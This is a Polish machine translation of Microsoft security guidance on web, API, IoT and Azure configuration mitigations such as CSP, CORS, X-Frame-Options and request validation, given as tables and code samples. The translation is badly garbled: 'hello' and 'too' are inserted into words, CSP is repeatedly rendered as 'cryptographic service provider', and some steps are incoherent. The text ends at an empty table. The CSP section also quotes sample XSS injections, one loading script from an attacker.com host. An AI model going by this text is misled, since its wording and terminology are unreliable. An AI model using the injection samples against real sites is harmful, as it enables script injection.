---
title: "aaaConfiguration zarządzania — narzędzie modelowania zagrożeń Microsoft - Azure | Dokumentacja firmy Microsoft"
description: "środki zaradcze w przypadku zagrożeń w hello narzędzie modelowania zagrożeń"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>Zabezpieczeń ramki: Zarządzanie konfiguracją | Środki zaradcze 
| Produktów i usług | Artykuł |
| --------------- | ------- |
| **Aplikacja sieci Web** | <ul><li>[Wdrożenie zasad zabezpieczeń zawartości (CSP), a następnie wyłącz wbudowanego javascript](#csp-js)</li><li>[Włącz filtr XSS przeglądarki](#xss-filter)</li><li>[Aplikacji programu ASP.NET, należy wyłączyć śledzenie i debugowanie wcześniejsze toodeployment](#trace-deploy)</li><li>[Dostęp do innych firm JavaScript tylko z zaufanych źródeł](#js-trusted)</li><li>[Upewnij się, że uwierzytelniony stron ASP.NET dołączyć Redressing interfejsu użytkownika lub obrony miejsca kliknij](#ui-defenses)</li><li>[Upewnij się, że tylko zaufane źródła są dozwolone włączenie mechanizmu CORS w aplikacji sieci Web ASP.NET](#cors-aspnet)</li><li>[Włącz parametr ValidateRequest atrybutu stron ASP.NET](#validate-aspnet)</li><li>[Użyj lokalnie hostowanych najnowsze wersje bibliotek JavaScript](#local-js)</li><li>[Wyłącz automatyczne wykrywanie MIME](#mime-sniff)</li><li>[Usuń nagłówki standard server na odcisków tooavoid witryn sieci Web systemu Windows Azure](#standard-finger)</li></ul> |
| **Baza danych** | <ul><li>[Konfigurowanie Zapory systemu Windows dla dostępu aparatu bazy danych](#firewall-db)</li></ul> |
| **Interfejs API sieci Web** | <ul><li>[Zapewni, że tylko zaufane źródeł włączenie mechanizmu CORS w interfejsu API sieci Web ASP.NET](#cors-api)</li><li>[Szyfrowanie sekcji składnika Web API pliki konfiguracyjne, które zawierają dane poufne](#config-sensitive)</li></ul> |
| **Urządzenia IoT** | <ul><li>[Upewnij się, że wszystkich interfejsów administracyjnych są zabezpieczony z silnych poświadczeń](#admin-strong)</li><li>[Upewnij się, że nieznany kod nie można wykonać na urządzeniach](#unknown-exe)</li><li>[Szyfrowanie systemu operacyjnego i dodatkowe partycje urządzenia IoT z bitowego skrytki](#partition-iot)</li><li>[Upewnij się, że tylko hello minimalna/funkcje usług są włączone na urządzeniach](#min-enable)</li></ul> |
| **Pole IoT bramy** | <ul><li>[Szyfrowanie systemu operacyjnego i dodatkowe partycje IoT pola bramy z bitowego skrytki](#field-bit-locker)</li><li>[Upewnij się, że poświadczenia logowania domyślne hello hello pola bramy są zmieniane podczas instalacji](#default-change)</li></ul> |
| **Brama chmury IoT** | <ul><li>[Upewnij się, że proces tookeep hello podłączone urządzenia oprogramowania układowego się toodate implementuje tego hello bramy chmury](#cloud-firmware)</li></ul> |
| **Granic zaufania maszyny** | <ul><li>[Upewnij się, że urządzenia mają skonfigurowane zgodnie z zasadami organizacji kontroli zabezpieczeń punktu końcowego](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zapewnienia bezpiecznego zarządzania kluczami dostępu do magazynu Azure](#secure-keys)</li><li>[Zapewni, że tylko zaufane źródeł włączenie mechanizmu CORS w magazynie Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Włącz usługę WCF dla funkcji ograniczania](#throttling)</li><li>[Ujawnienie informacji WCF za pomocą metadanych](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Wdrożenie zasad zabezpieczeń zawartości (CSP), a następnie wyłącz wbudowanego javascript

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [TooContent wprowadzenie zasad zabezpieczeń](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [zawartości informacje o zasadach zabezpieczeń](http://content-security-policy.com/), [funkcje zabezpieczeń](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [zasady zabezpieczeń toocontent wprowadzenie](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Dostawcy usług Kryptograficznych można użyć?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Kroki** | <p>Zasady zabezpieczeń zawartości (CSP) jest obrony zabezpieczeń mechanizm zabezpieczeń, W3C standard, który umożliwia formant toohave właściciele aplikacji sieci web na zawartość hello osadzone w lokacji. Dostawca usług Kryptograficznych jest dodawana jako nagłówka odpowiedzi HTTP na powitania serwera sieci web i są wymuszane na powitania po stronie klienta przez przeglądarki. Jest zasady na podstawie listy dozwolonych — witryny sieci Web mogą zadeklarować zestaw zaufanych domen, z którego zawartość, takich jak JavaScript może zostać załadowany.</p><p>Dostawcy usług Kryptograficznych zapewnia następujące korzyści w zakresie zabezpieczeń hello:</p><ul><li>**Ochrona przed XSS:** Jeśli strona jest narażony tooXSS, osoba atakująca może wykorzystać go w sposób 2:<ul><li>Wstaw `<script>malicious code</script>`. Lukę nie będą działać ze względu na tooCSP Base ograniczeń-1</li><li>Wstaw `<script src=”http://attacker.com/maliciousCode.js”/>`. Lukę nie będzie działać, ponieważ nie będzie hello domeny kontrolowane przez osobę atakującą w dostawcy usług Kryptograficznych w dozwolonych domen</li></ul></li><li>**Kontrolę nad danych exfiltration:** Jeśli żadnych złośliwej zawartości sieci Web próbuje tooconnect tooan zewnętrznej witryny sieci Web i kradzieży danych, hello połączenie zostanie przerwane przez dostawcy usług Kryptograficznych. Wynika to z faktu hello docelowej domenie nie będzie dozwolonych dostawcy usług chmury</li><li>**Obrony przed miejsca kliknij:** miejsca kliknij to technika ataku przy użyciu której atakujący dokonuje można ramki oryginalnego witryny sieci Web i wymusić tooclick użytkowników na elementy interfejsu użytkownika. Obecnie obrony przed miejsca kliknij osiągnięte przez skonfigurowanie odpowiedzi nagłówka X-Frame-Options. Nie wszystkie przeglądarki przestrzegać tego nagłówka i przechodzi do przodu dostawcy usług Kryptograficznych będzie toodefend standardowy sposób dla miejsca kliknij</li><li>**Raportowanie w czasie rzeczywistym ataku:** w przypadku ataku polegającego na iniekcji w witrynie sieci Web z obsługą dostawcy usług Kryptograficznych, przeglądarek automatycznie wyzwoli punktu końcowego powiadomienia tooan skonfigurowane na serwerze sieci Web hello. Dzięki temu dostawca usług Kryptograficznych służy jako system ostrzeżenie w czasie rzeczywistym.</li></ul> |

### <a name="example"></a>Przykład
Przykład zasad: 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Ta zasada umożliwia tooload skrypty tylko z serwera i google analytics serwera aplikacji sieci web hello. Skrypty załadowane z innych lokacji zostaną odrzucone. Po włączeniu w witrynie sieci Web dostawcy usług Kryptograficznych hello są następujące funkcje atakom XSS toomitigate automatycznie wyłączone. 

### <a name="example"></a>Przykład
Wbudowane skrypty nie zostanie wykonany. Poniżej przedstawiono przykłady wbudowanych skryptach 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Przykład
Ciągi jako kod nie zostanie obliczone. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Włącz filtr XSS przeglądarki

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Filtr XSS ochrony](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Kroki** | <p>Filtr skryptu krzyżowych X XSS ochrony odpowiedzi nagłówka konfiguracji formantów hello przeglądarki. Ten nagłówek odpowiedzi może mieć następujące wartości:</p><ul><li>`0:`Spowoduje to wyłączenie hello filtru</li><li>`1: Filter enabled`W przypadku wykrycia atak skryptowy między witrynami w kolejności atak powitania toostop, przeglądarki hello będzie oczyszczenia hello strony</li><li>`1: mode=block : Filter enabled`. Zamiast oczyszczenia stronie powitania po wykryciu ataków XSS, przeglądarki hello uniemożliwi renderowanie Witaj strony</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Przeglądarka Hello będzie oczyszczenia naruszenie hello hello strony i raportów.</li></ul><p>Jest to funkcja chromu przy użyciu dostawcy usług Kryptograficznych naruszenie raporty toosend szczegóły tooa URI wybranych przez użytkownika. Witaj ostatnich 2 opcje są uznawane za bezpieczne wartości.</p>|

## <a id="trace-deploy"></a>Aplikacji programu ASP.NET, należy wyłączyć śledzenie i debugowanie wcześniejsze toodeployment

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Przegląd debugowania ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET śledzenie — Przegląd](http://msdn2.microsoft.com/library/bb386420.aspx), [jak: włączyć śledzenie aplikacji ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [porady: Włączanie debugowania dla aplikacji ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Kroki** | Gdy śledzenie jest włączone dla strony hello, co przeglądarki żąda on również uzyskuje informacje o śledzeniu hello zawierającego dane dotyczące stanu wewnętrznego serwera i przepływ pracy. Te informacje można bezpieczeństwa poufnych. Podczas debugowania jest włączony dla strony hello, wykonywane na powitania serwera spowodować dane śledzenia stosu pełne błędy przedstawione toohello przeglądarki. Te dane mogą uwidaczniać informacje związane z zabezpieczeniami dotyczące powitania serwera przepływu pracy. |

## <a id="js-trusted"></a>Dostęp do innych firm JavaScript tylko z zaufanych źródeł

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | skrypty JavaScript innych firm powinny odwoływać się tylko z zaufanych źródeł. punkty końcowe odwołanie Hello powinna być zawsze na protokół SSL. |

## <a id="ui-defenses"></a>Upewnij się, że uwierzytelniony stron ASP.NET dołączyć Redressing interfejsu użytkownika lub obrony miejsca kliknij

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Kliknij miejsca arkusza Cheat obrony OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [wewnętrzne IE - zwalczania miejsca kliknij z X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **Kroki** | <p>Kliknij miejsca, znanej także jako "interfejsu użytkownika odwoławcze ataku", jest gdy osoba atakująca używa wielu warstw przezroczystego lub nieprzezroczystego tootrick użytkownika do kliknięcia przycisku lub łącza na innej stronie, gdy zostały one zamierzających tooclick na powitania strony najwyższego poziomu.</p><p>To nakładanie warstw uzyskuje się poprzez obsługuje tworzenie niebezpieczną stronę z elementem iframe, który jest ładowany ofiara hello strony. W związku z tym atakująca hello "przejmuje" klika przeznaczone dla ich strony i routing je strony tooanother, najprawdopodobniej należących do innej aplikacji, domeny lub oba. ataki miejsca kliknij tooprevent zestaw hello prawidłowego X-Frame-Options nagłówków odpowiedzi HTTP zawierający instrukcje toonot przeglądarki hello Zezwalaj ramek z innych domen</p>|

### <a name="example"></a>Przykład
Nagłówek X-FRAME-OPTIONS powitania można ustawić za pomocą pliku web.config usług IIS. Fragment kodu pliku Web.config dla witryny, które nigdy nie powinien być sformułowane: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Przykład
Kod pliku Web.config dla witryny, które powinny być obramowane tylko przez stron w hello sam domeny: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Upewnij się, że tylko zaufane źródła są dozwolone włączenie mechanizmu CORS w aplikacji sieci Web ASP.NET

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Formularze sieci Web, MVC5 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | <p>Poziom zabezpieczeń przeglądarki uniemożliwia wprowadzanie domeny tooanother żądania AJAX przez stronę sieci web. To ograniczenie jest nazywany zasadami samego pochodzenia hello i uniemożliwia złośliwa witryna odczytywanie danych poufnych z innej lokacji. Jednak czasami może być wymagane tooexpose interfejsów API bezpiecznie której można korzystać z innych lokacji. Między CORS Origin Resource Sharing () jest standardem W3C, dzięki której serwer toorelax hello samego pochodzenia zasad. Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin podczas odrzucenia innych użytkowników.</p><p>CORS jest bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP. Zasadniczo Włączanie mechanizmu CORS tłumaczy tooadding kilka nagłówków odpowiedzi HTTP (Access - Control-*) toohello aplikacji sieci web i to zrobić na kilka sposobów.</p>|

### <a name="example"></a>Przykład
Jeśli tooWeb.config dostępu jest dostępna, CORS, mogą być dodawane za pośrednictwem hello następującego kodu: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Przykład
Jeśli tooweb.config dostępu nie jest dostępna, CORS można skonfigurować przez dodanie następującego kodu CSharp hello: 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Ustaw jest krytyczne tooensure, że lista zawiera źródła w atrybucie "Access-Control-Allow-Origin" hello tooa zestaw skończona i zaufanych źródeł. Niepowodzenie tooconfigure tym niewłaściwie (np. ustawienie wartości hello jako "*") umożliwi tootrigger złośliwych witryn pochodzenia żądania obejmujące różne toohello aplikacji sieci web > bez ograniczeń, dzięki czemu ataków narażone tooCSRF aplikacji hello. 

## <a id="validate-aspnet"></a>Włącz parametr ValidateRequest atrybutu stron ASP.NET

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Formularze sieci Web, MVC5 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Żądanie sprawdzania poprawności - zapobieganie atakom skryptu](http://www.asp.net/whitepapers/request-validation) |
| **Kroki** | <p>Sprawdzanie poprawności żądań, funkcji programu ASP.NET od wersji 1.1, zapobiega hello serwer akceptowanie zawartości zawierającego HTML bez zakodowany. Ta funkcja została zaprojektowana toohelp zapobiec niektóre ataki uruchomienie skryptu, zgodnie z którymi kodu skryptu klienta HTML można lub nieświadomie przesłanych tooa serwera, przechowywane, a następnie udostępniana tooother użytkowników. Nadal zdecydowanie zaleca się zweryfikowanie wszystkich danych wejściowych, a kodowanie HTML, gdy jest to odpowiednie.</p><p>Weryfikacja żądania jest wykonywane przez porównanie wszystkich danych wejściowych tooa lista potencjalnie niebezpiecznych wartości. W przypadku dopasowania ASP.NET zgłasza `HttpRequestValidationException`. Domyślnie funkcja Weryfikacja żądania jest włączona.</p>|

### <a name="example"></a>Przykład
Jednak ta funkcja może zostać wyłączona na poziomie strony: 
```XML
<%@ Page validateRequest="false" %> 
```
lub na poziomie aplikacji 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Sprawdź należy pamiętać, że funkcja weryfikacji żądania nie jest obsługiwane i nie jest częścią MVC6 potoku. 

## <a id="local-js"></a>Użyj lokalnie hostowanych najnowsze wersje bibliotek JavaScript

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | <p>Deweloperzy przy użyciu standardowej biblioteki języka JavaScript, np. JQuery należy użyć zatwierdzone wersji wspólne biblioteki JavaScript, które nie zawierają luk w zabezpieczeniach znane. Dobrym rozwiązaniem jest toouse hello najbardziej najnowszej wersji biblioteki hello, ponieważ zawierają one poprawki zabezpieczeń dla znanych luk w zabezpieczeniach w ich starszych wersji.</p><p>Jeśli nie można użyć najnowszej wersji hello powodu toocompatibility przyczyny, należy używać hello poniżej minimalnej wersji.</p><p>Dopuszczalne minimalne wersje:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>1.9 weryfikacji JQuery</li><li>JQuery Mobile 1.0.1</li><li>Cykl JQuery 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Zestaw narzędzi kontroli AJAX**<ul><li>Zestaw narzędzi kontroli AJAX 40412</li></ul></li><li>**Formularze sieci Web ASP.NET i Ajax**<ul><li>Formularze sieci Web ASP.NET i Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nigdy nie załadować żadnej biblioteki JavaScript z zewnętrznych witryn, takie jak publiczny CDN</p>|

## <a id="mime-sniff"></a>Wyłącz automatyczne wykrywanie MIME

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Część zabezpieczeń programu IE 8 V: kompleksową ochronę](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [typ MIME](http://en.wikipedia.org/wiki/Mime_type) |
| **Kroki** | Nagłówek X-Content-typu-Options Hello jest nagłówka HTTP, która umożliwia deweloperom stosowanie toospecify, że jego zawartość nie powinny być ten sposób MIME. Ten nagłówek jest zaprojektowana toomitigate wykrywanie MIME ataków. Dla każdej strony zawierających zawartość sterowane użytkownika, należy użyć hello HTTP nagłówka X-zawartości — typ — opcje: nosniff. tooenable hello wymaganego nagłówka globalnie do wszystkich stron w aplikacji hello, można wykonać jedną z następujących hello|

### <a name="example"></a>Przykład
Dodaj nagłówek hello w pliku web.config hello, jeśli aplikacja hello jest obsługiwana przez Internet Information Services (IIS) 7 i jego nowszych wersjach. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Przykład
Dodaj nagłówek hello za pośrednictwem hello globalnego aplikacji\_powstaniem zdarzenia BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Przykład
Implementowanie niestandardowego modułu HTTP 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Przykład
Można włączyć wymaganego nagłówka hello tylko dla określonych stron, dodając tooindividual odpowiedzi: 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Usuń nagłówki standard server na odcisków tooavoid witryn sieci Web systemu Windows Azure

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | EnvironmentType - Azure |
| **Odwołania**              | [Usuwanie serwera standardowych nagłówków w witrynach sieci Web systemu Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Kroki** | Nagłówki, takich jak serwer X-zasilane-przez X AspNet wersji ujawnić informacje o serwerze hello i hello podstawowych technologii. Zalecane jest toosuppress te nagłówki, zapobiegając w ten sposób odcisków hello aplikacji |

## <a id="firewall-db"></a>Konfigurowanie Zapory systemu Windows dla dostępu aparatu bazy danych

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Database (Baza danych) | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Lokalnego programu SQL Azure |
| **Atrybuty**              | N/d, SQL - 12 |
| **Odwołania**              | [Jak tooconfigure Azure SQL bazy danych zapory](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Konfigurowanie Zapory systemu Windows dla dostępu aparatu bazy danych](https://msdn.microsoft.com/library/ms175043) |
| **Kroki** | Systemy zapory pomagać w zapobieganiu zasobów toocomputer nieautoryzowanego dostępu. tooaccess wystąpienia hello aparatu bazy danych programu SQL Server przez zaporę, należy skonfigurować hello zapory na hello dostępu tooallow programu SQL Server z uruchomionym |

## <a id="cors-api"></a>Zapewni, że tylko zaufane źródeł włączenie mechanizmu CORS w interfejsu API sieci Web ASP.NET

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | MVC 5 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Włączanie żądań Cross-Origin w składniku ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API — Obsługa mechanizmu CORS w składniku ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Kroki** | <p>Poziom zabezpieczeń przeglądarki uniemożliwia wprowadzanie domeny tooanother żądania AJAX przez stronę sieci web. To ograniczenie jest nazywany zasadami samego pochodzenia hello i uniemożliwia złośliwa witryna odczytywanie danych poufnych z innej lokacji. Jednak czasami może być wymagane tooexpose interfejsów API bezpiecznie której można korzystać z innych lokacji. Między CORS Origin Resource Sharing () jest standardem W3C, dzięki której serwer toorelax hello samego pochodzenia zasad.</p><p>Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin podczas odrzucenia innych użytkowników. CORS jest bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP.</p>|

### <a name="example"></a>Przykład
W hello App_Start/WebApiConfig.cs Dodaj następujące metody WebApiConfig.Register toohello kodu hello 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Przykład
Atrybut EnableCors może być zastosowane tooaction metod w kontrolerze w następujący sposób: 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Ustaw Pamiętaj, że jest ona tooensure krytyczny, który hello lista źródeł w atrybucie EnableCors tooa zestaw skończona i zaufanych źródeł. Niepowodzenie tooconfigure tym niewłaściwie (np. ustawienie wartości hello jako "*") umożliwi tootrigger złośliwych witryn cross pochodzenia żądania toohello API bez żadnych ograniczeń > dzięki czemu ataków narażone tooCSRF hello interfejsu API. EnableCors może korzystać na poziomie kontrolera. 

### <a name="example"></a>Przykład
toodisable CORS dla określonej metody w klasie, hello DisableCors atrybut może być używany, jak pokazano poniżej: 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | MVC 6 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Włączanie żądań między źródłami (CORS) w platformy ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Kroki** | <p>W programie ASP.NET Core 1.0 CORS można włączyć za pomocą oprogramowania pośredniczącego albo przy użyciu platformy MVC. Korzystając z MVC tooenable CORS hello tej samej usługi CORS są używane, ale hello nie jest oprogramowanie pośredniczące CORS.</p>|

**Podejście 1** Włączanie mechanizmu CORS z oprogramowania pośredniczącego: tooenable CORS dla całej aplikacji hello dodać przy użyciu metody rozszerzenia UseCors hello hello CORS oprogramowanie pośredniczące toohello żądania potoku. Podczas dodawania hello oprogramowanie pośredniczące CORS za pomocą klasy CorsPolicyBuilder hello można określić zasady cross-origin. Istnieją dwa sposoby toodo to:

### <a name="example"></a>Przykład
Hello jest najpierw toocall UseCors z wyrażenia lambda. Hello lambda przyjmuje obiekt CorsPolicyBuilder: 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Przykład
Hello jest drugi toodefine jeden lub więcej o nazwie zasady CORS i zasad wybierz opcję hello według nazwy w czasie wykonywania. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Podejście 2** Włączanie mechanizmu CORS w nazwie wzorca MVC: deweloperzy mogą również używać MVC tooapply określonych CORS każdej akcji, każdy kontroler lub globalnie do wszystkich kontrolerów.

### <a name="example"></a>Przykład
Każdej akcji: toospecify zasad CORS dla danego działania dodać akcję toohello atrybutu hello [EnableCors]. Podaj nazwę zasad hello. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Przykład
Na kontrolerze: 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Przykład
Globalnie: 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Ustaw Pamiętaj, że jest ona tooensure krytyczny, który hello lista źródeł w atrybucie EnableCors tooa zestaw skończona i zaufanych źródeł. Niepowodzenie tooconfigure tym niewłaściwie (np. ustawienie wartości hello jako "*") umożliwi tootrigger złośliwych witryn cross pochodzenia żądania toohello API bez żadnych ograniczeń > dzięki czemu ataków narażone tooCSRF hello interfejsu API. 

### <a name="example"></a>Przykład
toodisable CORS dla kontrolera lub akcji, użyj atrybutu hello [DisableCors]. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Szyfrowanie sekcji składnika Web API pliki konfiguracyjne, które zawierają dane poufne

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
